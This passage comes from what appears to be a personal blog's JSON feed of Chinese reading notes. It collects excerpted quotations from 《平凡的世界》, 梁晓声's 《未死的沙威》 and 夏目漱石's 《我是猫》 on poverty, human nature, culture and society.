你能感觉到的问题，任何一个有头脑，有良心的中国人都能感觉到。这不是我们几个人的忧虑，而是全国人民的忧虑。</p>\n<p>这些压抑而忧心的岁月啊。</p>\n<p>锁链可以锁住门窗，锁住手脚，但人心是锁不住的。</p>\n<p>一旦这热烈的向往落空，又很难从因此而造成的痛苦中解脱出来。她除过日常的生活和工作，又没有远大的事业上的追求来弥补感情上的损失。</p>\n<p>人们宁愿去关心一个蹩脚电影演员的鸡毛蒜皮，而不愿了解一个普通人波涛汹涌的内心世界。她是一个普普通通的人，她的思想，气质，感情，优点和缺点，都是属于普通人的。</p>\n<p>她在前方的战壕里拼命抵抗，但她为之而战的后方却自己烧成了一片火海。</p>\n<p>当国家出现不幸的时候，个人的不幸马上就会自己退到次要的位置。</p>\n<p>不过，目前这种批判性的意见只在心里而不会表现在嘴上，更不会表现在行动上。</p>\n<p>她开始动摇了，她的力量使她无法支撑如此巨大的精神压力。当然，除过客观的压力之外，她主观上的素养本来也不够深厚。是的，她现在还不能从更高意义上来理解自身和社会，尽管她是一个正直善良的人，懂事，甚至也有较鲜明的个性。但并不具有深刻的思想和广阔的眼界。因此，最终她还是不能掌握自己的命运。于是，她的所有局限性就导致她做出了违背自己心愿的决定。</p>\n<h3 id=\"2-99\"><a class=\"markdownIt-Anchor\" href=\"#2-99\">#</a> 2-99</h3>\n<p>她想亲近的人远离了她，而她竭力想远离的人终于没有能摆脱。这类生活悲剧的演出，不能简单归结为一个人的命运，而常常是当时社会的各种矛盾所造成的。</p>\n<p>牺牲自己而全力支撑这个穷家，这是他多年来的一贯信念，已经成了他的生活哲学。也正因为如此，他才没有从无数艰难和困苦之中垮下来，甚至因而感到自己活得还有点意思。</p>\n<p>他从此以后，就要开始这样生活：他每天要看的是家里的泪水、疾病，饥饿和愁眉苦脸。他将没有住处，在家里喝两碗稀汤饭后，继续到金家湾那边找地方睡。</p>\n<p>把黑夜留给鬼魅吧，白天应该是属于人的。</p>\n<p>生活像磨盘一样沉重的压在这个壮汉的胸口上，使他连气也喘不过来。</p>\n<p>他归根结底是农民的儿子，深知自己在这个天地里所处的地位。</p>\n<h3 id=\"3-27\"><a class=\"markdownIt-Anchor\" href=\"#3-27\">#</a> 3-27</h3>\n<p>他无法接受眼前的现实，但他也没有能力拒挡这个潮流。</p>\n<p>一茬又一茬的男人就是这样不知不觉的走上了严峻的生活舞台。</p>\n<p>回忆过去的相识，谈着眼下的生活，涉及着未来的光景……</p>\n<p>兄妹俩蹲在这个敞口子的土窑里，有滋有味的吃他们的晚饭。在这个世界上，有多少人能想到，在这样一些地方所过的那种艰辛生活呢？</p>\n<p>如今，生活使他们天各一方：但不论怎样，他依然感谢润叶，她给他那像土块一样平凡的一生留下了太阳般光辉的一页。他只能默默给她庄稼人的祝福。</p>\n<h3 id=\"3-28\"><a class=\"markdownIt-Anchor\" href=\"#3-28\">#</a> 3-28</h3>\n<p>因为贫穷，就以物遮目，变得如此愚蠢？</p>\n<p>生活就是这样，大分大合，这都是一定历史条件下的产物。人类正是从这样的不断的否定之否定中发展的。</p>\n<p>不幸的是，知道的太多了，思考的太多了，因此才有了这种不能为周围人所理解的苦恼。一个有文化有知识而爱思考的人，一旦失去了自己的精神生活，那痛苦是无法言语的。</p>\n<p>一切都将无比艰难，他赤手空拳，无异于一丛飘蓬。</p>\n<p>幸福不仅仅是吃饱穿暖，而是勇敢的去战胜苦难……</p>\n<p>他甚至没有考虑他为什么要忍受如此的痛苦，他认为这就是他的生活。</p>\n<p>这家就是个无底洞，把咱们这两个的骨头填进去，也填不了个底子。</p>\n<p>最大的好处就是，大街上谁也不认识谁，谁也不关心谁。他衣衫行装虽然破烂不堪，但照样可以在这个世界里自由行走，别人连笑话你的兴趣都没有。</p>\n<p>生活带来了繁荣，可是把原有的秩序给打破了。</p>\n<p>她将会变成自己记忆里的一个人，而在现实中他们不可能在见面。</p>\n<p>我不想让任何人知道我的情况，我也不愿让他们知道。这不是因为虚荣，而是不愿意遭受虚荣者的嘲笑；我想默默地宁静的走自己的路。</p>\n<p>他们没法直接参与到目前社会发展的主流当中，而他们又不甘心把自己局限在狭小的生活天地里。因此，他们往往带着一种悲壮的激情，在一条最为艰难的道路上进行人生的搏斗。他们顾不得高谈论阔或愤世嫉俗的忧患人类的命运。</p>\n<p>他们首先得改变自己的生存条件，同时也不放弃最主要的精神追求，他们既不鄙视普通人的世俗生活，但又竭力使自己对生活的认识达到更深的层次。</p>\n<p>是的，她和他尽管社会地位和生活处境不同，但在人格上是平等的 — 这种关系只有在共同讨论的基础上才能形成。或许他们各自都有对方需要改造的地方、改造别人就是对自己本身的改造。</p>\n<h3 id=\"3-29\"><a class=\"markdownIt-Anchor\" href=\"#3-29\">#</a> 3-29</h3>\n<p>可以用理想的标准要求人，但拿他来估计人是不行的。</p>\n<p>世界上有些人因为忙而感到生活的沉重，也有些人因为闲而活得很压抑。</p>\n<p>只有他自己才能体验到这件事的残酷性，他也并不指望别人能够理解他。</p>\n<p>他也不知道自己为什么就跑到这里来了，就好像他在这地方丢失了什么贵重的东西，尽管毫无指望再拾回来，但仍然还要反复寻找。</p>\n<p>他从没有想过要改变他的生活方式，浪荡的品质似乎都渗进了他的血液里。</p>\n<p>对于大多数人来说，生活的变化是缓慢的。今天和昨天似乎没有什么不同；明天也可能和今天一样。也许人一生仅仅有那么一两个辉煌的瞬间 — 甚至可能一生都在平淡无奇中度过。</p>\n<p>每个人的生活同样也是一个世界。即使最平凡的人，也得要为他的那个世界的存在而战斗。从这个意义上来说，在这些平凡的世界里，也没有一天是平静的。</p>\n<p>钱是好东西，它能使人不再心慌，并且叫人产生自信心。</p>\n<p>他提起那卷破烂行李，迈着两条无力的腿，向那个熟悉的地方走去。</p>\n<p>作家对当时的生活做出了不准确的认识和结论，就连他所描写的生活也失去了价值。</p>\n<p>他没有体验过饥饿是什么滋味，也不知道一个人穿着破烂衣服站在同学们中间，自尊心会遭受折磨。他所做的一切，都是由性格本身所致。</p>\n<p>生活不能等待别人来安排，要自己去争取和奋斗；而不论其结果是喜是悲，总不枉在这世上活了一场人。</p>\n<p>落魄的人只要和朋友待在一块，心里就会踏实下来。</p>\n<p>她说什么我听不懂，我说什么她也听不懂，互相急的用手比划。但两个人都知道对方说什么。她扑在了我的怀里；我紧紧的抱住了她。那时世界上一切都不存在了。但实际上，什么都存在着。</p>\n<h3 id=\"3-30\"><a class=\"markdownIt-Anchor\" href=\"#3-30\">#</a> 3-30</h3>\n<p>她最怕过一种安宁日子，把自己的精神囿于痛苦的内心世界。</p>\n<p>她似乎习惯了这种处境，最少在生人看来，她的一切都是正常的。</p>\n<p>伤口仍然存在，疼痛就不可排解。她的生活实际上还是全都笼罩在这件事的阴影中。</p>\n<p>在她二十八年短短的生命历程中，他是她全部幸福和不幸的根源。</p>\n<p>可怕的是，公众舆论、复杂的社会关系以及传统的道德伦理理念，像千万条绳索在束缚着她的手脚 – 解除这些绳索就不那么简单了。更可悲的是，所有绳索之外，也许最难挣脱的是她自己那条精神上的绳索。</p>\n<p>如果我们是善良的，我们就会普遍同情所有人的不幸和苦难。</p>\n<p>青年人是更具有可塑性的，他们随时都发生变化，甚至让我们都认不出他的面目来。</p>\n<p>从此以后，她就堕入了一片黑暗之中。过去的一切都成了一场梦。她不抱怨任何人，只抱怨她自己。她亲手把自己的青春年华毁灭了。</p>\n<p>这些东西像是腐蚀剂，必然带来眼界狭窄，自制力减弱、奋斗精神衰退等等弊端。</p>\n<p>只有选定了目标并在奋斗中感到自己的努力没有虚掷！这样的生活才是充实的。</p>\n<p>他还应该像往常一样，精神抖擞的跳上这辆生活的马车，坐在驾辕的位置上，绷紧全身的肌肉和神经，吆喝着、呐喊着，继续走向前去。</p>\n<p>如果能深刻理解苦难，苦难就会给人带来崇高感。</p>\n<p>既然这样决定了，就应该毫不畏惧的投入这种生活。</p>\n<p>对他们来说，忘却一切并不可怕，记着一切倒挺可怕的。</p>\n<p>因为你痛苦，就说明你对生活还抱有希望！可如今的希望是绝望的痛苦；绝望的痛苦甚至使人不再痛苦 — 既然生活没有了希望，还有什么必要再痛苦呢？如果痛苦不能改变生存，还不如平静地将自己毁灭。一切都毁灭了，只有生命还在苟延残喘。这样的生命还有什么存在的价值。</p>\n<p>死被暂时忘记了，活人的痛苦又尖锐的主宰了他的意识。</p>\n<p>甚至在我们生命的结束之前，也许还不会看到这个社会的完全成熟。</p>\n<h3 id=\"3-31\"><a class=\"markdownIt-Anchor\" href=\"#3-31\">#</a> 3-31</h3>\n<p>哪怕他今生一世暗淡无光，可他在自己的生命历程中，仍然还有值得骄傲和怀念的东西啊。而不至于像一些可怜的乡下人，老了的时候，坐在冬日里冰凉的土坑上，可以回忆和夸耀的仅仅是自己年轻时的饭量和力气。</p>\n<p>生活包括着更广阔的意义，而不在于我们实际得到了什么。</p>\n<p>人处在幸福与不幸交织的矛盾中，反而使内心有一种更为深刻的痛苦。看来近在眼前的幸福而实际上又远得相当渺茫。放不得抓不住，一腔难言的滋味。有时候还不如活在纯粹的清苦与孤独之中。</p>\n<h3 id=\"3-60\"><a class=\"markdownIt-Anchor\" href=\"#3-60\">#</a> 3-60</h3>\n<p>只要有人的地方，世界就不会是冰冷的。没有什么东西能够比温暖的人情更为珍贵 — 你感受到生活的真正美好，莫过于这一点了。</p>\n<p>山还是原来的山，人还是原来的人，东拉河依旧唱着它不倦的歌谣淌过这个平凡的村庄。</p>\n<p>当年在这里命丧黄泉的金辉武，坟头早已被青草覆盖，而人间地生活却照样在这里轰轰烈烈地进行着。</p>\n<p>他那心酸的生活史使他时刻保持着对普通人的痛苦的敏感而入微的体会。</p>\n<p>虽然这是和平而正当的征服，但这是一种比战争还严酷的征服；被征服者丧失的不仅是财产，而且还有精神的被占领。</p>\n<h3 id=\"3-61\"><a class=\"markdownIt-Anchor\" href=\"#3-61\">#</a> 3-61</h3>\n<p>他知道，外面的人很少了解这个世界的情况。他们更瞧不起生活在这个世界里的人。</p>\n<p>悲剧，其开头往往是喜剧。这喜剧在发展，剧中人喜形于色；沉湎于绚丽的梦幻中。可是突然……</p>\n<p>他颓然坐在潮湿的地上，嘴里发出轻轻的呻吟。黑暗无声无息。此刻，他就像身处另外一个无生命的世界，永远再不能返回人间。</p>\n<p>有些人的某些行为也许永远无法使别人理解 – 甚至连他本人也理解不了。</p>\n<p>只有毒辣辣的太阳和滚烫烫的石碾盘，才能使他冰凉干瘦的身体得到某种抚慰。</p>\n<p>一个人孤零零地躺在这里，成为了生活中一名无足轻重的 “观众”。</p>\n<p>当一个人集中凝视自己的不幸时，他就很难想象别人的苦难。</p>\n<p>既然你生来就要无尽的受苦受难，你为什么要相信那偶然一瞬间出现在你眼前的光辉呢？永远不要再抱有什么幻想，命运就决定你该如此生活。</p>\n<p>她日复一日开始了她那麻木不仁的生活。没有笑容，也不哭泣。没有过去，也无未来。天明时，她去干活；天黑时，她就睡觉。所谓明天，也无非是和今天同样的一天。</p>\n<p>生活中真正的勇士向来默默不闻，喧哗不止的永远是自视甚高的一群人。</p>\n<p>这是一个奇特的生存部落。先进与落后，文明与野蛮，高尚与卑俗，新的与旧的，全都混杂并存，交织在一起。</p>\n<p>一个平凡而普通的人，时时都会感到被生活的狂涛巨浪所淹没…… 你会被淹没吗？除非你甘心就此而沉沦？</p>\n<p>不久青草就会埋住他的坟头，这个普通人的名字也会在人们的记忆里消失。</p>\n<p>既然命运使他成为现在这个样子，她就得再挣扎着活着。</p>\n<p>他不知道，当他涉足于那地方的时候，等待他的将是什么。</p>\n<p>任何时候，处在失败者的位置上，就得忍受屈辱。</p>\n<p>只有繁重的体力劳动，才使精神上的痛苦变为某种麻木，以至使思维局限在机械性的活动中！他真没有勇气去面对残破不堪的现实。</p>\n<h3 id=\"3-62\"><a class=\"markdownIt-Anchor\" href=\"#3-62\">#</a> 3-62</h3>\n<p>刹那间，一切都想肥皂泡幻灭了。他以前所相信的一切都变得迷离混沌、精神上所有的支柱都开始摇摇欲坠。因为理想太光辉，一旦破灭，绝望就太深。</p>\n<p>人本身就是自私的，可我却真诚的相信人，真是咎由自取。</p>\n<p>人生，就是这样不可预测。没有永恒的痛苦，没有永恒的幸福。</p>\n<p>在天堂与地狱之间原来只有一步之遥。</p>\n<p>事情看起来是偶然发生的，可实际上也是必然的。不幸的种子一开始就隐藏在我们之间，只不过我们起初没有看见罢了。</p>\n<p>有时候，现实生活中某些引起社会强烈震动的突发性事件，往往是由历史所发出的回声。</p>\n<p>过去、现在、未来，生命中的全部痛苦都凝聚在了这一瞬间。人生最宝贵的一切就这样早早的结束了吗？</p>\n<p>一切都结束了。他告别的是人生整整一个段落。青春之花，永远的凋谢在了这片草原上。这是壮丽的凋谢。他失去的，也正是他收获的。</p>\n<p>有时候，往往一个极偶然的因素，就可能改变一个人的生活。</p>\n<p>不管盲目还是失败，只要敢出征的将士，就应该受到敬重。</p>\n<p>赚钱既是目的，也是充实我们生活的一种途径。归根结底，最值钱的是让我们活得有意义。</p>\n<p>生活的大轮前行，时间在无声的消逝。</p>\n",
            "tags": [
                "社会",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/40%E3%80%8A%E6%9C%AA%E6%AD%BB%E7%9A%84%E6%B2%99%E5%A8%81%E3%80%8B%E6%A2%81%E6%99%93%E5%A3%B0/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/40%E3%80%8A%E6%9C%AA%E6%AD%BB%E7%9A%84%E6%B2%99%E5%A8%81%E3%80%8B%E6%A2%81%E6%99%93%E5%A3%B0/",
            "title": "《未死的沙威》梁晓声",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我们处在一个垃圾、概念太多的文化时代，切莫人云亦云，以其昏昏使人昏昏。</p>\n<h3 id=\"4-5\"><a class=\"markdownIt-Anchor\" href=\"#4-5\">#</a> 4-5</h3>\n<p>极端的功利主义者，他们的思想方向，不但直奔好处，而且最讲实际。功利主义的思潮，恰恰是大学里的主要思潮。表面看，大学是有机会了解各种哲学和主义的地方。而真相也许是，功利主义最为深入人心。</p>\n<p>他们最初也许和我们大多数人一样，同样是怀着相当功利的想法与书结爱的。但是越到最后，他们与书的关系越来越趋向于自然而然。终于功利淡出目的，成为了一种特别纯粹的习惯。</p>\n<p>在兴趣阅读或纯粹习惯性的阅读时，我偶然所获的某些知识，更能使我思考。而不太能使我思考的知识，我一向认为那是别人所需要的，非我所需。知识是因人而异才成为知识的。</p>\n<h3 id=\"4-6\"><a class=\"markdownIt-Anchor\" href=\"#4-6\">#</a> 4-6</h3>\n<p>有时某书中的某几行字，确乎足以像钥匙一样，帮我们打开我们看待世界的另一扇门，使我们承认我们以前自以为清楚明白的了解，其实是很局限的。</p>\n<p>人眼被功利阅读所强占的时间太多太久，它对另外的书是会麻木的，它对读书这一件事是会出现叛逆的。</p>\n<p>所有这些电视剧在我看来也不过是那公司，那女人，那阴谋和那一大笔钱。我们几乎完全放下了对于我们这个国家现实的关注，尤其是对于底层民众的生活的关注。</p>\n<p>以为我穷，以为我卑微，以为我难看，就以为我没有感情吗？我和你一样，心中是有感情的。</p>\n<p>科技的直接介入，是否会异化人类的文化本身？异化了的人类文化，是否会使人类在不知不觉中迷失了文化这一人类与古往今来的理性灯塔。</p>\n<p>是我们文化形态中的虚假多，还是我们现实生活中的虚假更多。</p>\n<p>人类世界依然有着太多的不幸、苦楚和灾难，以及所造成的悲伤，惊悸和恐惧。有些是自然力造成的，有些是人类自己造成的。在世界的不少地方，眼泪、鲜血和死亡，依然在人类的心灵上重创为巨大的伤口。</p>\n<p>人类在最根本的方面将永远是平等的，也许地球上千般万种的生物一样不能超乎法则之上。从根本上来讲，我们都是一样的。如此一样的我们，相互对立、敌视、憎恶，上演着一出又一出的大戏。</p>\n<p>人们的思想方法被普遍同化了，也普遍趋于简单化了。仿佛都渐渐地习惯于束缚在这样的一种思维定式之中，即 — 人对世事的看法只能有一种是正确的，或接近正确的。与之相反，便是不正确的，甚或及其错误的。</p>\n<p>世人对世事所公认的那一种正确的看法，历来都是诸种正确的看法的综合。这个世界上，从来没有谁能够独自对某件事 — 哪怕是一件世人无不亲历之事，比如爱情吧 — 作出过完全正确的看法。</p>\n<p>大多数的交流只是小聪明而已，这种东西构成了一种文化的泡沫，只有意思而没有任何意义。弱小的民族可能在快乐的过程中仅仅被塑造成了只会娱乐的动物。</p>\n<h3 id=\"4-7\"><a class=\"markdownIt-Anchor\" href=\"#4-7\">#</a> 4-7</h3>\n<p>对于中国，我们很难从非国家行为的大片中看到人类正面价值观念的自信的表现，倒是对阴谋诡计的着力构想似乎来得更加自信和如鱼得水。中国大片除了能夸耀其宣传造势和商业利润，还能有另外的什么良好感觉？</p>\n<p>一个人在物质上清贫以后，在精神上非但没有萎靡，反而竟那么豪迈了起来。</p>\n<p>个人身世凄苦，往往形成两种人格–或富有同情之心，或竟完全的失去。因了一己身世的凄苦而一味咒怨社会，于是对人世间落在别人身上的凄苦麻木了。</p>\n<p>他的人生在别人看来也许太单调，然而正是这一点，使他成了一个脱离一切低级趣味的人。</p>\n<p>相似之人类相似之路然皆无正果，各自人生追求终于皆归破灭的悲剧，而那悲剧往往具有一个类似的群体的时代宿命之缩影的意味。</p>\n<p>我们处在一个垃圾、概念太多的文化时代，切莫人云亦云，以其昏昏使人昏昏。</p>\n<p>只为文凭的，大约除了文凭，更是什么也没有得到。</p>\n<p>仅仅具有本能情感的人是没有进化的人。因为本能的情感，那是连动物也有的。甚至，在动物身上，也偶尔表现有超本能的情感。没有文化方式所进行的教育，人类的历史将停止在奴隶社会。而那时的人类，是凶恶的。</p>\n<p>文学归根结底不可能是一件一个人可持续地一味写自己给别人看的事情，这断然难以持续。文学是一个人将写一些人的命运给另一些人看的事情。</p>\n<p>在现实生活中，一个既不抬头也不回头的人是不可思议的。一个每天高昂着头，然而现实在其眼中，仿佛一切都虚掉了，仅剩了自己的一个现实目的地的人，这样的人学着中文，无论对于自己还是对于中文，都是极大的讽刺。</p>\n<p>中国人在从前的时代，受理想一词的伤害很深、很大。这使我们有一种心理，我们对于凡是具有理想色彩的事情，都抱有本能的潜意识的排斥。</p>\n<h3 id=\"4-8\"><a class=\"markdownIt-Anchor\" href=\"#4-8\">#</a> 4-8</h3>\n<p>后来在 “文革” 中，我以青年人的眼，看到了那么多形形色色的沙威式的人物。他们是人，但是他们内心里绝对没有人性的温度。他们冷酷无情，他们在那个年代，完全变为没有正义可言，没有公平可言的国家机器的一部分。</p>\n<p>一个人过分强调自己所理解的文学理念的话，有时可能会显得迂腐，有时会显得过于理想主义，甚至有时会显得偏激。</p>\n<p>被王权利用的宗教会变质，变质后就会成为统治人们精神生活的方式，当宗教走到这一步，从最初的人文愿望就变成了反人性。</p>\n<p>在舞台上真正占据主角的必然是人上人，而最普通的人要进入文艺，需经过很漫长的争取、不经过这个争取，只能是配角。</p>\n<p>他很奇怪，为什么一个我们的同类在受鞭笞的时候，有那么多同类围观，从中得到娱乐？这在动物界里是没有的，在动物界不会发生这样的情景，一种动物在受虐待的时候，其他动物会感到欢快。动物不是这样的，但是人类居然是这样的。认为主义就是在嘲弄这一点。</p>\n<p>幸福的家庭是类似的，不幸的家庭各有各的不幸。</p>\n<p>人类的思想和文化并非窒息于专制，而是死于娱乐。</p>\n<p>娱乐使我们同而不和，思考使我们和而不同。</p>\n<p>思考的过程、产生思想的过程，是一个非常快乐的过程。这种快乐是其他快乐无从取代的。我们将因而活得更像人，更愉快、更自然。</p>\n<p>社会所普遍需求的非是原态的知识，而是由知识化成为的从业能力。归根结底，在当前的时代，仅靠书本知识得以维生的，毕竟只不过是极少数。大多数人都要靠能力从业。</p>\n<p>假话，却肯定是站带着千般万种的私利和私欲的话。假话里产生不了任何有益于社会功利的意义。即使不正确的真话，也将一再证明着人说真话的一种极正当的、极符合人性的权力。</p>\n<p>工作问题亦即生存问题，乃是一脚迈出校门后的当下问题，迫切问题，无法不面对的最现实问题。</p>\n<h3 id=\"4-9\"><a class=\"markdownIt-Anchor\" href=\"#4-9\">#</a> 4-9</h3>\n<p>谁斗争你，你就让他们斗吧。这世界，任何人，总难免斗过来斗过去的。斗过去就完了。完了就完了。</p>\n<p>不甘自暴自弃，故至今仍然勤奋着。妄图靠了勤奋，最终能自己为自己弥补点儿安慰。这在别人看来或许是可笑的。我一向宽厚待人，到了这把年纪，终于明白人对自己也不能太苛刻。</p>\n<p>官员通过上层路线而成了公仆，公仆越做越大，离百姓的生活确是越来越远。这样的公仆，有耳，那耳也只剩下了一个功能 — 专听山峰旨意和官场动向，有眼，那眼液不再能看到别的，仅见上峰的脸色如何和官场的晋升绝窃而已。对于百姓之疾苦，他们视而不见，听而不闻。</p>\n<p>他虽然是人，但却几乎没有人性。他只不过是专制的国家的一个齿轮。一个在粗陋的模子里铸造成的然而一旦扭在专制的国家机器的某一处很低微的部位，其作用又是绝对不容忽视的。</p>\n<p>在他那骇人的欢乐里，正如每一个得志的小人一样，却也有值得怜悯的东西。那副面孔所表现的，使我们可以称之为 “忠诚” 的万恶，世界上没有任何东西比着更惨更可怕的了……</p>\n<p>他已经看得分明，他们嘴上所说的，和他们实际上心里所想的，暗地里所感的，原来是那么的不一样。权、钱、色才构成了他们的真正的追求目的。沙威也不例外。</p>\n<p>他并不感到自己的行为可耻。他认为真正丑陋的并非自己，而是逼自己为罪犯的社会现实。认为如果有上帝，一定能够从天堂看到人世间所发生的许多悲剧，并能分清善与恶，得出和自己一样的结论……</p>\n<p>他留给同志们的老实印象，是他伪装出来的假相。他的灵魂深处，其实存在许多肮脏的，可耻下流的，见不得人的丑陋的思想意识。</p>\n<p>无比虔诚的也是鼓足了从来不曾有过的大勇气所进行的一次忏悔。他原本以为自己忏悔了之后灵魂就变得及其圣洁了，并且会感动别人的。但是他遭到了咒骂和殴打。这就是真相。</p>\n<h3 id=\"4-10\"><a class=\"markdownIt-Anchor\" href=\"#4-10\">#</a> 4-10</h3>\n<p>然老百姓明摆着都是弱势的，能从荒诞中汲取的，只不过是明哲保身的狡黠而已。人世间的狡黠太多了，它就是没什么意思了。倒是那强势的人们，该从依稀的烟气中看到禁忌，和黑色的不幽默。</p>\n<p>我对我们的中国被撕裂的现状，获得了又一次明显而深刻的经验，我觉得我自己仿佛也在被缓缓的撕裂着–从产生情怀的地方，到进行思想的地方。</p>\n<p>人类在矇昧时期恐惧自然界对自己的危害。人类越文明，则越清楚的意识到 — 其实更值得恐惧的是人性自身的恶。人类尝此恶果远甚于自然界对自己的危害。于是人类只得靠宗教来威吓自身。</p>\n<p>我的回忆使我至今相信 — 如果说人类的不快乐有三分之二是由于清贫所至，那么也许是有三分之一恰恰是由于对享受式的生活太过奢望而自造自加的烦恼吧？</p>\n<p>人其实无需向人生诉求的太多。理当满足仍不满足的人，那也许是上苍在折磨他们的欲望。</p>\n<hr>\n",
            "tags": [
                "意义",
                "历史",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/43%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B%E5%A4%8F%E7%9B%AE%E6%BC%B1%E7%9F%B3/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/43%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B%E5%A4%8F%E7%9B%AE%E6%BC%B1%E7%9F%B3/",
            "title": "《我是猫》夏目漱石",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>这些近视者所能看到的，实在浅薄的可怜。</p>\n<h3 id=\"4-33\"><a class=\"markdownIt-Anchor\" href=\"#4-33\">#</a> 4-33</h3>\n<p>告诉你吧，所谓人类，就是假装正经的强盗啊。</p>\n<p>他这个人活像脾气怪癖的牡蛎，整天蜷伏在书斋里，从来没有向外界探过头。但他却摆出一副只有自己颇有远见卓识的面孔，真是滑稽可笑。</p>\n<p>也许像主人那样表里无一的人，才有必要记日记，把不能向社会公开的真实自我在暗室里发泄一番。</p>\n<p>难得的机会，会驱使所有的动物甘冒风险去做他们本来不想做的事。</p>\n<p>我想人这种东西，为了消磨时间，硬要运动他们的嘴巴，把本来不可笑的事笑上一翻，把本来没有多大意思的事，津津乐道一翻，除此之外，再无别的本领了。</p>\n<h3 id=\"4-34\"><a class=\"markdownIt-Anchor\" href=\"#4-34\">#</a> 4-34</h3>\n<p>似乎自以为超然物外，其实他们仍然未能忘怀尘世，而是充满俗情、竞争之念，争强斗胜之心，就连在他们平素的谈笑之中，也时有流露。他们再陷下去，就会和他们平素唾骂的俗物成为一丘之貉。</p>\n<p>在天下之一隅，居然会有如此怪人也生活在阳光下，是做梦也没有料到的。</p>\n<p>她说话的语气越来越显露出她是个什么货色。她简直就像为吵架而来的。</p>\n<p>我吹牛不过是吹吹而已，可那个女人吹牛，却是别有用心，不怀好意。</p>\n<p>当 “理” 在这边而 “权力” 在对方的时候，要么放弃自己的 “理”，老老实实顺从对方，要么瞒过权力的耳目来贯彻自己的理。强权即公理，至于说到我的选择，当然是后者。</p>\n<p>世界上就有这种不知天高地厚的人，他不肯承认自己没本领，却一味对有财产的人发火，就好像他们的财产被别人骗去了似的，真令人吃惊。</p>\n<p>也许宇宙的真理正在他那满是头屑的脑袋里不停的回转，但从外形看去，你做梦也不会猜到有那种事。</p>\n<p>要当实业家就必须当个上边的，要在下边，仍然得到处去说那些无聊的奉承话，或者出席些无聊的宴会，真没意思极了。</p>\n<p>他虽然生来是个不会说客套话、顽固死板的人，但话说回来，他和那种冷酷无情的产物却是大异其趣的。</p>\n<p>如果只是他，根本不在乎学位，只是不能不考虑外界，不能就这样简易从事。</p>\n<p>在人世上，不管什么事，只要是个采取积极行动的人，总会拥有效仿他人的权利。</p>\n<p>只是本身又如何呢？如果作为对知识的报酬给予某种东西，那就必须是比知识还要贵重得多的东西。但是，在人世上，难道还有比知识更贵重的珍宝吗？自然是不会有的。假如给予不相称的奖赏，那就只能有损于知识的权威性。</p>\n<p>在当今时代不必要的争论能避开就尽量避开，没有用处的争吵是封建时代的遗物。人生的目的不在于口舌之争，而在于行动。只要事情能按自己的意图一步步地进展下去，那么人生的目的也就达到了。</p>\n<h3 id=\"4-35\"><a class=\"markdownIt-Anchor\" href=\"#4-35\">#</a> 4-35</h3>\n<p>要是我们那伙人谈话，那就得小心翼翼，一点大意不得呀。不管说什么总得留神，又操心又紧张，真是苦恼极了。</p>\n<p>他们这些人的两只眼睛都长在一个平面上，很难同时看清左右，所以进入他们视界中的只能是片面的事物，这正是人的可怜之处。</p>\n<p>人在学习实用语言时，除了重复他所听到的语言以外，是毫无其他奢望的。他知识竭尽全力进行模仿。这种由模仿出来的语言经过十年二十年以后，之所以在发音上出现变化，说明他们缺少真正的模仿能力。</p>\n<p>只手物象驱使的那些俗人，因为他们除受五官刺激之外就再也没有任何活动，在他们评价别人时，决不涉及形骸以外之物，这是最难办的。这些肉眼凡胎之辈，都是天生的一些只看外形不见内心的视觉残缺不全者。</p>\n<p>我既然与这些庸夫俗子厮混在一起，也就只好降格以求，化为庸猫罢了。我既然想做一只庸猫，当然得抓老鼠。就这样，我终于决心去抓老鼠了。</p>\n<p>一般的事儿我都晓得，不晓得的只是自己的愚蠢罢了。不过，对这点我还是模模糊糊的晓得点的。</p>\n<p>世人的评价，根据时间和情况再不断变化，就像在下的眼珠一样。我的眼珠只不过是变大变小而已，但人的品评却会整个颠倒过来。颠倒过来当然不要紧。事物总有两面，总有两端。在同一事物上使其产生非黑即白的变化，这点正是人的圆滑融通之处。</p>\n<p>尽管它利用这种无用的长物企图进行一次垂死挣扎，而实际上对我当然是丝毫不起作用的。名义上它在挣扎，而事实上只不过是在地面上爬行而已。</p>\n<p>人们怕死就得穿衣服，大家都穿上衣服，人就变成了穿衣服的动物。一旦成了穿衣服的动物以后，就突然碰上裸体动物，就不承认它是人，而是兽了。</p>\n<p>衣服对人成了及其重要的大条件，它重要到甚至使人产生疑问：到底是衣服重要呢，还是人重要？简直可以说，人的历史不成其为血肉之躯的历史，而成了衣服的历史了。</p>\n<p>如果全体怪物都一致同意做怪物，那么怪物这个称呼也就自然消失了。</p>\n<h3 id=\"4-36\"><a class=\"markdownIt-Anchor\" href=\"#4-36\">#</a> 4-36</h3>\n<p>在古时候，自然是平等创造了人，把他们跑到世界上来。所以不论是什么样的人，生下来都是赤条条的。假如人安于平等的本性，那么应当就这样赤条条的生活下去。</p>\n<p>正如自然忌讳真空一样，人类是讨厌平等的。在今天，由于讨厌平等不得不将衣服当成毛皮一样罩在身上的今天，如果想舍掉人的本质的一部分的衣服，回到赤条条的旧阿蒙的公平时代去，那只能是狂人所为。即使有人甘冒狂人之名，也是无法倒退回去的。用文明人的眼光来看，那些想倒退回去的人只能是怪物。</p>\n<p>因为他们回到了一般人类所生息的人世，理所当然的必须采取人所采取的行动，就要穿上文明所必备的衣服。</p>\n<p>可是随着这些君子们在这所学校不断接受教育，似乎越来越不像君子了。到了今天，这些污秽的词语几乎成了有教养的君子们所学的唯一语言了。</p>\n<p>捉弄这种行为，说穿了就是制造刺激来游戏的一种娱乐。古时候那些热衷于捉弄人作为娱乐的人，不外乎是两种人，要么是从不考虑别人感情的蠢侯爷这类闲得慌的人；要么是除了自己寻找乐趣之外无暇考虑其他事的，头脑还处于幼稚状态，而又不知道怎样消耗自己精力的少年。</p>\n<p>工人虽未被锁链锁起来，但却被薪俸捆住了手脚。</p>\n<p>那他只能堕落为无所事事的、除了吃饭之外一无所能的凡夫俗子。</p>\n<p>推动整个社会的，千真万确是金钱。</p>\n<p>固执也未尝不可，不过你在坚守这种信念的过程中，既影响自己的学问研究，又给每天的工作带来困难，最后还不是弄得精疲力竭，吃亏的是自己。</p>\n<p>如果不能生下来就是适应社会的，那么，你或者这样不合时宜的活下去，或者一直忍